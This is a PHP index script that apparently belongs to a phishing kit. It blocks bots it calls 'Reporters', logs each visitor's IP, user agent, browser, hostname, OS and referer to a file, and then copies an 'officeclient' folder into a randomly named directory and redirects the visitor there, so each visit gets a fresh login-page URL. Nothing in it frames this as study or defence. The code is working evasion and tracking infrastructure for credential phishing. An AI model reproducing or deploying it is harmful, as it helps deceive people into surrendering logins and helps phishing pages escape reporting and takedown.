<?
/*
* index.php
* 
* Logging user info then redirect to login page , with unique url each time
*/

//Block bots (Reporters)
require_once 'officeclient/block.php';


//Call Log Files
require_once 'log/os.php'; // Determine User Operating System info
require_once 'log/browser.php'; // Determine User Browser
require_once 'log/log.php'; // Logging class


// Get User Agent Info (IP, ISP, Browser info.etc)
$IP = "IP Adress: " .getenv("REMOTE_ADDR"); // Get user IP
$Agent = "User Agent: " .$_SERVER['HTTP_USER_AGENT']; //Get User Agent
$browserType = "Browser: "  .getBrowser($_SERVER['HTTP_USER_AGENT']);
$hostname = "Hostname: " .gethostbyaddr($_SERVER['REMOTE_ADDR']); //Get User Hostname
$OS = "Operating System: " .getOS($_SERVER['HTTP_USER_AGENT']); //Get User Operating System
$Referer = "Referer: " .$_SERVER['HTTP_REFERER']; //Get User Referer



// Logging class initialization
$log = new Logging();

// set path and name of log file (optional)
$log->lfile('log/logs.txt');
 
// write message to the log file
$log->lwrite('=============================Begin of Log '.$IP.' ============================');
$log->lwrite($IP);
$log->lwrite($Agent);
$log->lwrite($browserType);
$log->lwrite($hostname);
$log->lwrite($OS);
$log->lwrite($Referer);
$log->lwrite('=============================End of Log '.$IP.' ============================');
$log->lwrite("\n \n");

// close log file
$log->lclose();



//Create Random Folder

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="officeclient";
recurse_copy( $src, $dst );
header("location:$dst");



?>
